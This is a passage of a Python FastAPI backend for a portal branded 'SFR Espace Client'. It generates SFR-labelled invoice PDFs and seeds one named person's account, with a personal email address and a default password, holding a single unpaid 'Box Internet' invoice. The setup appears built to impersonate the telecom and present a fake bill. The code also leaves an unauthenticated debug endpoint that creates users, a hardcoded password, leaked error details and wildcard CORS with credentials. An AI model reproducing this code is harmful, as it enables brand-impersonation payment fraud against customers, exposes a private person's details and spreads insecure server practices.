    c.drawRightString(w - 26 * mm, y - 8 * mm, f"{inv['amount']:.2f} EUR".replace(".", ","))

    c.setFillColor(colors.HexColor('#9ca3af'))
    c.setFont("Helvetica", 8)
    c.drawString(20 * mm, 15 * mm, "SFR — Facture générée automatiquement par votre Espace Client.")
    c.showPage()
    c.save()
    buf.seek(0)
    return StreamingResponse(
        buf,
        media_type="application/pdf",
        headers={"Content-Disposition": f'attachment; filename="facture-{inv["number"]}.pdf"'},
    )


# ---------------------------------------------------------------------------
# Seeding
# ---------------------------------------------------------------------------
async def seed():
    await db.users.create_index("email", unique=True)
    await db.users.create_index("login", unique=True)
    await db.password_resets.create_index("expires_at", expireAfterSeconds=0)

    email = os.environ.get("SEED_CLIENT_EMAIL", "dacostakanan@gmail.com").lower()
    login = os.environ.get("SEED_CLIENT_LOGIN", "dacostakanan").lower()
    password = os.environ.get("SEED_CLIENT_PASSWORD", "Sfr@2026!")

    # Migration: remove legacy multi-invoice seed data (keep only Box Internet invoices)
    await db.invoices.delete_many({"label": {"$ne": BOX_INVOICE_LABEL}})

    user = await db.users.find_one({"email": email})
    if user is None:
        created = await create_user(login, email, "Kanan Da Costa", password)
        user_id = created["id"]
    else:
        user_id = user["id"]
        if not verify_password(password, user["password_hash"]):
            await db.users.update_one({"id": user_id}, {"$set": {"password_hash": hash_password(password)}})

    await ensure_unpaid_box_invoice(user_id)
    logger.info("Seed complete")


@api_router.get("/")
async def root():
    return {"message": "SFR Espace Client API", "status": "ok"}


@api_router.get("/debug/auth-selftest")
async def debug_auth_selftest():
    """Temporary endpoint to surface create_user failures on Railway."""
    steps = []
    try:
        steps.append("ping")
        await db.command("ping")
        steps.append("count_users")
        n = await db.users.count_documents({})
        steps.append(f"users={n}")
        steps.append("hash")
        h = hash_password("test")
        steps.append(f"hash_len={len(h)}")
        steps.append("jwt")
        t = create_access_token("debug-user", False)
        steps.append(f"jwt_len={len(t)}")
        steps.append("create_or_get")
        u = await get_or_create_user_by_email("debug-selftest@example.com")
        steps.append(f"user_id={u.get('id')}")
        inv = await ensure_unpaid_box_invoice(u["id"])
        steps.append(f"invoice={inv.get('id') if inv else None}")
        return {"ok": True, "steps": steps}
    except Exception as e:
        logger.exception("selftest failed")
        return JSONResponse(
            status_code=500,
            content={"ok": False, "steps": steps, "error": f"{type(e).__name__}: {e}"},
        )


@api_router.get("/health")
async def health():
    try:
        await db.command("ping")
        return {"status": "ok", "mongo": True}
    except Exception as e:
        return {"status": "degraded", "mongo": False, "error": str(e)[:200]}


@app.exception_handler(Exception)
async def unhandled_exception_handler(request: Request, exc: Exception):
    logger.exception("Unhandled error on %s %s", request.method, request.url.path)
    return JSONResponse(status_code=500, content={"detail": str(exc), "type": type(exc).__name__})


app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.on_event("startup")
async def on_startup():
    global db, DB_NAME
    try:
        names = await client.list_database_names()
        preferred = _normalize_db_name(os.environ.get("DB_NAME", "Sfr"))
        match = next((n for n in names if n.lower() == preferred.lower()), preferred)
        if match != DB_NAME:
            logger.warning("Switching DB_NAME %s -> %s (existing databases)", DB_NAME, match)
            DB_NAME = match
            db = client[DB_NAME]
        logger.info("Using MongoDB database: %s", DB_NAME)
    except Exception as e:
        logger.error("DB name resolve failed: %s", e)
    try:
        await seed()
    except Exception as e:
        logger.error("Seed failed (app continues): %s", e)


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()


# Serve CRA build (Railway monolithe) — after API routes
if STATIC_DIR.is_dir():
    assets_dir = STATIC_DIR / "static"
    if assets_dir.is_dir():
        app.mount("/static", StaticFiles(directory=str(assets_dir)), name="spa-assets")

    @app.get("/")
    async def spa_index():
        index = STATIC_DIR / "index.html"
        if index.is_file():
            return FileResponse(index)
        return {"message": "SFR Espace Client API"}

    @app.get("/{full_path:path}")
    async def spa_fallback(full_path: str):
        if full_path.startswith("api"):
            raise HTTPException(status_code=404, detail="Not found")
        candidate = STATIC_DIR / full_path
        if full_path and candidate.is_file():
            return FileResponse(candidate)
        index = STATIC_DIR / "index.html"
        if index.is_file():
            return FileResponse(index)
        raise HTTPException(status_code=404, detail="Not found")
